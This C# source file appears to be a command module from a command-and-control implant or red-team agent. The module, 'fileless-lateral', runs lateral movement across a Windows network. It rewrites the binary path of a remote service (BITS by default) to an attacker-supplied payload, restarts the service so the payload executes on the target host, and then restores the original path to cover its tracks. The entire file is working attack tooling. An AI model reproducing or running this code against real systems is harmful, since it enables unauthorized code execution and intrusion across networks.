using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Agent.Models;
namespace Agent.Commands
{
    public class FilelessLateralMovement : AgentCommand
    {
        public override string Name => "fileless-lateral";

        public override string Execute(AgentTask task)
        {
            if (task.Args is null || task.Args.Length == 0)
            {
                return "Provide target and payloadString";
            }
            var target = task.Args[0];
            var payloadString = task.Args[1];
            return ExecuteFileLessLateralMovement(target, payloadString);
        }
        public static string ExecuteFileLessLateralMovement(string targetHost, string payload, string serviceName = "BITS")
        {
            string originalBinPath = "";
            string result = "";
            // get original bin path
            if (!Internal.Services.QueryRemoteServiceBinaryPath(targetHost, serviceName, ref originalBinPath))
            {
                return "Failed You probably dont have admin access to this machine via this user";
            }
            // edit binpath to payload
            if (!Internal.Services.EditRemoteServiceBinary(targetHost, serviceName, payload))
            {
                return "Failed to edit binary path";
            }
            Internal.Services.QueryRemoteServiceBinaryPath(targetHost, serviceName, ref payload);
            // stop service if started
            var stopRes = Internal.Services.StopRemoteService(targetHost, serviceName);
            if (!stopRes)
                return "Failed to stop service but thats OK!\nAttempting to start with new binpath";
            Thread.Sleep(5000);
            // start service
            var res = Internal.Services.StartRemoteService(targetHost, serviceName);
            int dwErr = Marshal.GetLastWin32Error();
            if (!res && dwErr != 1053)
            {
                result += "service start failed\n";
            }
            else
            {
                result += "service start succeeded\n";
            }
            // revert service back to original state
            if (!Internal.Services.EditRemoteServiceBinary(targetHost, serviceName, originalBinPath))
            {
                return $"FAILED {result} -> Failed to revert service...this isnt good lol";
            }
            Internal.Services.QueryRemoteServiceBinaryPath(targetHost, serviceName, ref originalBinPath);
            return $"{result} -> Reverted Service bin Path {targetHost} -> {originalBinPath}...This indicates that everything went smoothly.";
 
        }
    }

}
